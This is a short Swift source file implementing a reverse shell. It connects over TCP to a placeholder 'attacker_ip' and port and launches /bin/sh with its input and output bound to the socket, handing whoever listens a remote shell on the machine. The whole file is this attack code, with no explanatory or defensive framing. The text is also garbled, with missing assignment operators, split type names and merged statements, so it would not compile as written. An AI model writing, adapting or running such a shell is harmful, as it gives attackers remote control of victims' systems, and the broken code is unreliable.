import Foundation

let host = "attacker_ip"

let port = attacker_port

func connect() {

let sock socket (AF_INET, SOCK_STREAM, 0)

var addr = sockaddr_in()

addr.sin_family sa_family_t(AF_INET)

addr.sin_port = in_port_t(UInt16(port).bigEndian)

inet_pton (AF_INET, host, &addr.sin_addr)

let connected withUnsafePointer(to: &addr) {

connect(sock, UnsafePointer sockaddr>(Opaque Pointer($0)),

socklen_t(Memory Layout sockaddr_in>.size))

}

if connected == 0 {

let shell = Process()

shell.launchPath = "/bin/sh"

shell.standardInput FileHandle(fileDescriptor: sock) shell.standardOutput FileHandle(fileDescriptor: sock)

shell.standardError FileHandle(fileDescriptor: sock)

shell.launch()

}

}

connect()